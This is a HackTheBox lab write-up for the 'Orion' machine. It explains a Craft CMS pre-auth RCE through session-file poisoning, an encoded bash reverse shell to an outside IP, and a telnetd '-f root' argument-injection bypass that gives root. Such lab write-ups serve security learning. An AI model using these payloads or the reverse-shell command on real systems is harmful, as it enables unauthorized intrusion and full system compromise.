# Orion — HackTheBox Writeup

**Target:** Orion  
**Platform:** HackTheBox  
**Difficulty:** Easy  
**Category:** Web Enumeration, Craft CMS, Pre-Authentication Remote Code Execution, Session Poisoning, PHP Object Injection, Telnet, Argument Injection, Authentication Bypass, Privilege Escalation

---

## Recon

As usual, the first stage starts with a service scan using Nmap to map the available attack surface.

```bash
sudo nmap -sC -sV TARGET_IP -o nmap -v
```

![nmap](images/nmap.png)

The scan output shows that the web service on port 80 redirects every request to the hostname `orion.htb`. This pattern indicates the application runs as a virtual host: without that hostname resolving to the target IP, requests would only land on the default nginx page. The hostname was therefore added to the host file first.

```bash
sudo vim /etc/hosts
```

![web](images/web.png)

The page that appears is a company portal with an admin login page inside it. Since the scan output points to a single web application with a login page, enumeration was directed at that application, and since this is a CMS-based application with many endpoints, directory enumeration was run in the background while the front page was browsed manually, so the tool's waiting time would not be wasted.

---

## Web Enumeration

```bash
gobuster dir -u http://orion.htb/ -w $seclists/Discovery/Web-Content/raft-small-words.txt
```

![gobuster](images/gobuster.png)

Gobuster found `/admin`, which is a login portal, and in the process leaked the stack version in use, namely **Craft CMS 5.6.16**.

![portal](images/portal.png)

That specific version is in fact a far more valuable finding than the directory list itself. An admin control panel always means additional attack surface behind authentication, and in a CMS such a login page is generally reachable without any credentials at all. On top of that, a CMS that states its version explicitly turns CVE mapping into a deterministic job: all that is needed is matching that version against the Craft CMS vulnerability history, instead of guessing which class of bug might be present.

---

## Initial Foothold — Craft CMS Pre-Auth RCE (CVE-2025-32432)

From the version research, Craft CMS 5.6.16 is known to be affected by **CVE-2025-32432**, a pre-authentication remote code execution rated critical. The following public PoC repository was used for exploitation.

```text
https://github.com/c0gnit00/CVE-2025-32432
```

The root cause lies in how Yii2, the framework behind Craft, handles behavior attachment. A component can have a behavior injected through a key prefixed with `as `, for example `as test`, and the processing in `Component::__set()` does two things that are inconsistent with each other.

First, class validation is performed against the `class` key using `is_subclass_of($value['class'], Behavior)`. That key must contain a legitimate `yii\base\Behavior` subclass, and in the payload it is filled with `craft\behaviors\FieldLayoutBehavior` so the check passes. Second, object instantiation is handed to `Yii::createObject()`, and that function reads the `__class` key **first**, before the `class` key. This means the class that actually gets instantiated is determined by a key that is never validated.

The result is type confusion: one class is checked, another class is executed. The endpoint that opens this path is `POST /index.php?p=admin/actions/assets/generate-transform` with a JSON body containing `assetId` and `handle`. The `handle` value flows into `ImageTransforms::normalizeTransform()`, then `ImageTransform::__construct()`, then `App::configure()`, and ends up in `Component::__set()`. One technical detail is worth noting: that endpoint returns a 404 when `assetId` does not exist, so a valid asset ID has to be found first — on this machine ID `1` is valid — for the payload to actually reach the instantiation path.

Arbitrary object instantiation alone is not enough for code execution, because a gadget chain that ends in execution is still required. There is one detail that is easy to overlook at this stage: even though this vulnerability is pre-authentication, the action on that endpoint still validates a CSRF token. That token has to be fetched from the login page first, together with the session cookie handed out in the same response, because the ID in that cookie is what later determines the name of the session file being poisoned. Two gadget chains are used together in that repository, and they complement each other.

- `GuzzleHttp\Psr7\FnStream` with the `_fn_close` property, because this class's destructor calls `call_user_func(_fn_close)`, so any function can be invoked when the object is destroyed. This chain is used to prove the endpoint can indeed instantiate an arbitrary class.
- `yii\rbac\PhpManager` with the `itemFile` property, because this component performs `require_once` on the file it points to. By directing `itemFile` to a file whose contents can be controlled, the PHP inside that file gets executed.

The file referenced as the target is the attacker's own PHP session file, and populating it requires no authentication at all. When an anonymous user opens an admin page, Craft stores the requested URL as `returnUrl` inside the session. That URL is serialized verbatim, so parameters in the query string are written into the session file without sanitization. By placing a PHP tag in the `a` parameter, the session file contents become a mix of serialized data and PHP code.

```text
/var/lib/php/sessions/sess_<CraftSessionId>
__returnUrl|s:...:"http://orion.htb/index.php?p=admin/dashboard&a=<?=passthru($_GET["cmd"]);die()?>";
```

Combining the two yields full execution: `PhpManager.itemFile` is pointed at the poisoned session file, and the command is sent through the `cmd` parameter, matching the `passthru($_GET["cmd"])` payload embedded in the session file.

```bash
python exploit.py -u http://orion.htb/ -c "echo 'YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTUuNzYvOTAwNCAwPiYxJw==' | base64 -d | bash"
```

![shell](images/shell.png)

The command above returns a reverse shell in the context of the `www-data` user. As a version note, this bug was fixed in Craft CMS 3.9.15+, 4.14.15+, and 5.6.17+, so version 5.6.16 used by the target sits exactly one release before the patch.

---

## Enumeration as www-data

Once inside the machine, enumeration was directed at services not exposed to the outside network. The checks revealed a live port 23, meaning a telnet service is running on the machine. Its version was verified directly from inside the shell.

```bash
telnet -V
```

![telnet](images/telnet.png)

This machine uses telnet 2.7. The fact that the service only lives internally and never showed up in the initial scan makes it easy to miss: the entry point is not the network, but the shell obtained earlier. Services bound only to loopback are usually assumed to be unreachable from the outside, so they are often skipped during hardening. Once shell access is obtained, that protection disappears by itself, because anything reachable from localhost becomes reachable by the attacker.

---

## Privilege Escalation — GNU InetUtils telnetd Authentication Bypass (CVE-2026-24061)

Research on that telnet version surfaced **CVE-2026-24061**, an authentication bypass in GNU InetUtils telnetd.

```text
https://www.offsec.com/blog/cve-2026-24061/
```

This CVE is an authentication bypass in GNU InetUtils telnetd caused by argument injection (CWE-88). USER input is not validated properly, so it can be processed as the `-f` option by the login program. In `login`, the `-f` option means forcing a login for the named user without asking for a password — and that is what allows authentication to be bypassed entirely.

The payload required is very short.

```bash
USER='-f root' telnet -a 127.0.0.1
```

Because telnetd accepts the connection from loopback and the `USER` variable contains a string starting with a minus sign, its value is treated as an option of the login program rather than as a username. The `-f root` argument is passed on to `login`, so the resulting session belongs to root directly.

![root](images/root.png)

The USER input triggers argument injection in telnetd, bypasses authentication, and grants root access. Success was verified by running `id`, which showed `uid=0(root)`.